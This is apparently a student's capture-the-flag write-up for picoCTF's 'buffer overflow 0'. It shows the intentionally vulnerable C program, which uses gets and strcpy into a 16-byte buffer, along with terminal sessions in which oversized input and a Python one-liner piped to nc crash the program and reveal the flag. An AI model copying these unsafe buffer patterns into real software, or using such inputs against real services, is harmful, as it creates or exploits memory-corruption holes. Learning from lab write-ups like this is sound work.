# Binary Exploitation  

## buffer overflow 0  

<img width="437" alt="image" src="https://github.com/user-attachments/assets/0078a210-2430-4c15-a763-79d5637f74eb" />  

The program given was:   
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```  

A **buffer** is any **temporary storage space in memory** where data(which is usually user input) can be stored.  
Since they hold user input, when an attacker inputs some data that is outside the buffer space, mistakes can be made, allowing an attacker to _overwrite other data_.  
This is called **Buffer Vulneralibility**.  

In this challenge, we had to deal with the given size of the buffer variable `buf2`, and simply had to input some value of size **more than 16 bytes**.   
Also, `strcpy` doesn't check any boundaries, which allows us to overflow it if our input is longer than 16 bytes.    
Observing next, since `gets` also reads input till newline, we can again overflow the `buf1` buffer (**100 bytes**) to control the memory beyond it.  

Initially, I tried to input some random strings, to which it just exited the program. On running the program, it showed:     
```
root@DESKTOP-0QGCC7M:/mnt/c/Users/Laptop/Downloads# gcc -o vuln vuln.c
root@DESKTOP-0QGCC7M:/mnt/c/Users/Laptop/Downloads# ./vuln
root@DESKTOP-0QGCC7M:/mnt/c/Users/Laptop/Downloads# ./vuln
Input: yes
The program will exit now
root@DESKTOP-0QGCC7M:/mnt/c/Users/Laptop/Downloads# ./vuln
Input: djwhdwohiwfhciedjiwfjwjfejfejwfe
*** stack smashing detected ***: terminated
Aborted (core dumped)
```

So I started the instance and tried to enter something more than 16 bytes.  
```
root@DESKTOP-0QGCC7M:/mnt/c/Users/Laptop/Downloads# nc saturn.picoctf.net 63835
Input: jdeiufeucnejnejfnecsnfcnediwejcfniewkncfedf
picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}  
```

Found the flag:  
**`picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}`**  

_One more way_ I tried was to print something muliplied by some integer in a way that it would become more than 16 bytes.  
I used here Python to exploit.  
```  
root@DESKTOP-0QGCC7M:/mnt/c/Users/Laptop/Downloads# python3 -c "print('P' * 24 + 'Q' * 8)" | nc saturn.picoctf.net 63835
Input: picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}  
```

Here, `'P' * 24` fills the memory, while `'Q' * 8` helps in overflow.   
Resources like https://ctf101.org/binary-exploitation/buffer-overflow/ were really helpful while understanding the basic concepts.  












